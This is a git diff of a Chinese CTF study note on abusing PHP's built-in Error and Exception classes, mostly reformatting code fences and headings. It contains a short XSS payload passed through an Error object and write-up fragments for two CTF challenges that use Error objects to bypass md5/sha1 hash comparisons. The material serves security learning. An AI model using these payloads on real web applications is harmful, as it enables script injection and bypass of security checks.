@@ -37,7 +37,7 @@ php7以上
 
 开启报错情况下
 
-```PHP
+```php
 <?php
 highlight_file(__FILE__);
 $a=new Error("<script>alert(1)</script>");
@@ -51,15 +51,14 @@ echo $c;
 
 造成了xss攻击。
 
-## Exception类**
+## Exception类
 
-**利用条件**
+利用条件：
+`php5、php7
+`开启报错的情况下
 
-php5、php7
 
-开启报错的情况下
-
-```PHP
+```php
 <?php
 highlight_file(__FILE__);
 $a=new Error("<script>alert(1)</script>");
@@ -71,7 +70,7 @@ echo $c;
 
 就是上面的换了一个类
 
-### [BJDCTF 2nd]xss之光 
+### BJDCTF 2nd【xss之光】 
 通过git拿到源码
 
 ```php
@@ -100,7 +99,7 @@ Echo urlencode(serialize($poc));?>
 
 测试代码
 
-```PHP
+```php
 <?php
 $a = new Error("payload",1);
 echo $a;
@@ -108,7 +107,7 @@ echo $a;
 
 发现会以字符串进行输出，包括当前的错误信息payload以及报错的行号2，传入 Error("payload",1) 中的错误代码“1”则没有输出出来。
 
-```Bash
+```php
 <?php
 $a = new Error("payload",1);
 $b = new Error("payload",2);
@@ -119,7 +118,7 @@ echo $b;
 
 输出:
 
-```HTTP
+```php
 Error: payload in D:\phpstudy_pro\WWW\test.php:2
 Stack trace:
 #0 {main}
@@ -133,10 +132,10 @@ Stack trace:
 
 可以利用这个方法绕过哈希比较。
 
-[2020 极客大挑战]Greatphp
+### 2020 极客大挑战【Greatphp】
 考点：php内置绕过哈希比较、php取反绕过
 
-```Bash
+```php
 <?php
 error_reporting(0);
 class SYCLOVER {
@@ -164,13 +163,13 @@ if (isset($_GET['great'])){
 
 要是常见的php题目，可以数组绕过强类型。在这题目中，需要Error类。
 
-```PHP
+```php
 if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)))
 ```
 
 md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 方法；且当eval()函数传入一个类对象时，也会触发这个类里的 __toString 方法。
 
-![](https://ucnckoaspefs.feishu.cn/space/api/box/stream/download/asynccode/?code=OTI1NjY1MjUxOTExMWU5YjAxZTBkZWFlNDRiZTE5MjVfclJiczNLZkZ4NDBKSVFmWmlvY0RUQXdnYXkyVHd1T2pfVG9rZW46S3FrbmJWQ01Db05HRFl4U1VpTWNUb0g5bldkXzE3NjQ1MzA3NTk6MTc2NDUzNDM1OV9WNA)
+![700](assets/php原生类利用/file-20251212232247762.png)
 
   
 
